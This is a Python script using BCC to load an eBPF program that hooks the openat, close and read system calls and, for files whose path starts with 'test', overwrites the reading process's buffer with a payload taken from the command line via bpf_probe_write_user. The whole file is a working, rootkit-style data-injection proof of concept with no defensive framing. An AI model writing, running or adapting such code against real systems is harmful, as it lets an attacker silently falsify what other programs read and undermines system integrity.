#!/usr/bin/python3

from __future__ import absolute_import, division, print_function, unicode_literals
from bcc import BPF
import ctypes
import sys
import time

text = """
#include <bcc/proto.h>
#include <linux/socket.h>
#include <linux/uio.h>
#include <linux/skbuff.h>
#include <linux/pid.h>
#include <net/af_unix.h>

#define UINT8_MAX (255)
#define UINT32_MAX (4294967295UL)

typedef struct notify {
  uint8_t data[128];
} notify_t;
BPF_PERF_OUTPUT(output);

inline static void notify(notify_t* n, struct pt_regs* ctx) {
  output.perf_submit(ctx, n, sizeof(notify_t));
}
  /*notify_t n;
  #pragma unroll
  for (size_t i = 0; i < sizeof(n.data); i++) {
    n.data[i] = 0;
  }
  notify(&n, ctx);*/

static inline int is_file(char const __user* pathname) {
  char const key[] = "test";
  char const path[sizeof(key)];
  // bpf_trace_printk("%s\\n", pathname);
  bpf_probe_read((char*)&path, sizeof(path), pathname);

  #pragma unroll
  for (size_t i=0; i<sizeof(key); i++) {
    char c = path[i];
    if (key[i] != c) {
      return 0;
    }
  }
  return 1;
}

BPF_HASH(hookopenat, u64, u64);

int kprobe____x64_sys_openat(struct pt_regs *ctx,
    int dirfd, char const __user* pathname, int flags) {

  if (dirfd != AT_FDCWD || pathname == NULL || flags != O_RDONLY) {
    return 0;
  }

  if (is_file(pathname)) {
    u64 pid_tgid = bpf_get_current_pid_tgid();
    u64 pid = (u32)(pid_tgid >> 32);
    hookopenat.update(&pid, &pid);
  }
  return 0;
}

BPF_HASH(fdmap, u64, u64);

int kretprobe____x64_sys_openat(struct pt_regs *ctx) {
  u64 pid_tgid = bpf_get_current_pid_tgid();
  u64 pid = (u32)(pid_tgid >> 32);

  u64* p;
  p = hookopenat.lookup(&pid);
  if (!p) {
    return 0;
  }

  int ret = PT_REGS_RC(ctx);

  // bpf_trace_printk("%d\\n", ret);
  if (ret > 0) {
    u64 kv = (((u64)ret) << 32) ^ pid;
    bpf_trace_printk("hooking open: %lx\\n", kv);
    fdmap.update(&kv, &kv);
    hookopenat.delete(&pid);
  }
  return 0;
}

int kprobe____x64_sys_close(
    struct pt_regs *ctx,
    int fd) {
  u64 pid_tgid = bpf_get_current_pid_tgid();
  u64 pid = (u32)(pid_tgid >> 32);
  u64 kv = (((u64)fd) << 32) ^ pid;

  u64* p;
  p = fdmap.lookup(&kv);
  if (p) {
    fdmap.delete(&kv);
  }
  return 0;
}

BPF_HASH(hookread, u64, char*);

int kprobe____x64_sys_read(struct pt_regs *ctx,
    int fd, void *buf, size_t count) {

  u64 pid_tgid = bpf_get_current_pid_tgid();
  u64 pid = (u32)(pid_tgid >> 32);
  u64 kv = (((u64)fd) << 32) ^ pid;

  u64* p;
  p = fdmap.lookup(&kv);
  if (p) {
    hookread.update(&pid, (char**)&buf);
  }

  return 0;
}

int kretprobe____x64_sys_read(struct pt_regs *ctx) {
  u64 pid_tgid = bpf_get_current_pid_tgid();
  u64 pid = (u32)(pid_tgid >> 32);

  char** bufp = NULL;
  bufp = hookread.lookup(&pid);
  bpf_trace_printk("sys_read\\n");
  if (!bufp) {
    return 0;
  }
  int ret = PT_REGS_RC(ctx);
  char __user* buf = *bufp;

  char payload[] = "~ ~ ~ ~ ~ """ + sys.argv[1] + """ ~ ~ ~ ~ ~";

  if (ret > 0) {
    if (sizeof(payload)-1 >= ret) 
      bpf_trace_printk("Out of buffer, please make your input size smaller.\\n");
    else {
      bpf_trace_printk("Successfully insert payload!");
      bpf_probe_write_user(buf, &payload, sizeof(payload)-1);
    }
  }

  hookread.delete(&pid);

  return 0;
}

"""


class notify_t(ctypes.Structure):
  _fields_ = [
    ("data", ctypes.c_uint8*128),
  ]

def handle_event(cpu, data, size):
  try:
    notify = ctypes.cast(data, ctypes.POINTER(notify_t)).contents
    print(repr(notify))

  except KeyboardInterrupt:
    sys.exit(0)

#b = BPF(text=text).trace_print()
b = BPF(text=text, debug=0x8)
#b = BPF(text=text)

b["output"].open_perf_buffer(handle_event)

b.trace_print()
